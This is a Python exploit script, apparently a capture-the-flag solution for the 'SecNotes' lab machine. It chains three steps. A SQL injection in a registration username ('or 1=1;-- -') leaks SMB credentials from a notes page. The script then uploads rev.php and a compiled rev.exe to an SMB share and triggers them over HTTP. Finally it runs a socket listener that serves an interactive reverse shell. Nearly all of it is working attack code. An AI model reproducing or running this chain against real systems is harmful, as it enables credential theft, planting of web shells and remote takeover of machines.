import requests
from bs4 import BeautifulSoup
import argparse
import subprocess
from smb.SMBConnection import SMBConnection
import socket
import time

parser = argparse.ArgumentParser()
parser.add_argument("attack_ip")
parser.add_argument("attack_port")
args = parser.parse_args()

# Getting SMB Creds from site.

prefix = input("Type some garbage here!")

reg_info = {
    'username': prefix+"\' or 1=1;-- -",
    'password': 'password',
    'confirm_password': 'password'
}

reg_resp = requests.post('http://10.10.10.97/register.php', reg_info)

print(reg_resp.status_code)

login_info = {
    'username': prefix+"\' or 1=1;-- -",
    'password': 'password'
}

login_resp = requests.post('http://10.10.10.97/login.php', login_info)

print(login_resp.status_code)

notes_html = BeautifulSoup(login_resp.text, 'html.parser')

divs = notes_html.find_all(attrs={'class':'panel center-block text-left'})

creds_note = divs[-1].pre.getText()

creds = creds_note.split("\n")[-1].split(" / ")

username = creds[0]
password = creds[1]

print("Got username and password "+username+" "+password)


compile_command = "make ATTK_HOST="+args.attack_ip+" ATTK_PORT="+str(args.attack_port)

proc = subprocess.Popen(compile_command.split(" "))

# SMB Magic here

conn = SMBConnection(username, password, my_name='ThoseGuys', remote_name='SECNOTES', use_ntlm_v2=True, is_direct_tcp=True)

conn.connect('10.10.10.97', 445)

files = conn.listPath(service_name='new-site', path="")

[print(file.filename) for file in files]

with open("rev.php", 'rb') as rev_php:
    conn.storeFile('new-site', path='rev.php', file_obj=rev_php)

with open("build/rev.exe", 'rb') as rev_exe:
    conn.storeFile('new-site', path='rev.exe', file_obj=rev_exe)

files = conn.listPath(service_name='new-site', path="")

[print(file.filename) for file in files]

requests.get("http://10.10.10.97:8808/rev.php")

LISTEN_IP="0.0.0.0"
# Change this to whatever the target will try and connect to.
LISTEN_PORT=int(args.attack_port)
BUFFER_SIZE=1024

# Set this higher if you're getting jank problems with recieved data getting messed up our out of sync...
tuning=1

# set up out socket and start listening for those juicy requests.
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((LISTEN_IP, LISTEN_PORT))
s.listen(1)
conn, addr = s.accept()
print("Connection from"+" "+str(addr))
# This reverse shell needs an inital enter to start working.
conn.send(b'\n')
while 1:
    data = ""
    # Give the target box a chance to send everything it's going to send.
    time.sleep(tuning)
    # Pull some stuff from the buffer.
    # Loop through if there's more than the buffer size in data, and stop when there's less than the buffer size (ie, we've emptied it)
    while 1:
        recv_data = conn.recv(BUFFER_SIZE)
        if not recv_data: break
        data += recv_data.decode()
        if len(recv_data) < BUFFER_SIZE: break
    if not data: break
    # Print out the response from the target without a newline, so we get a nice C:\><write command> prompt.
    print(data, end="")
    # Send out data, appending a \r\n so things work properly in windows land.
    tosend = input()
    if tosend == "exit_shell": break
    tosend = tosend + '\r\n'
    conn.send(tosend.encode("utf-8"))
conn.close()

